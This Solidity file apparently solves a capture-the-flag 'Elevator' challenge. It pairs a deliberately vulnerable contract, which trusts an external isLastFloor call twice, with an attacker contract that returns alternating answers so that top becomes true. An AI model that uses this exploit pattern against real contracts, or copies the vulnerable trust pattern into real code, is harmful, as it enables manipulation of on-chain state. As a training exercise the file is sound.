// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract HackElevator is Building {
    uint256 entryCount;

    function isLastFloor(uint256 floor) external override returns (bool) {
        if (entryCount % 2 == 0) {
            entryCount++;
            return false;
        } else {
            entryCount++;
            return true;
        }
    }

    function callGoTO(uint256 floor, address targetContract) external {
        Elevator(targetContract).goTo(floor);
    }
}
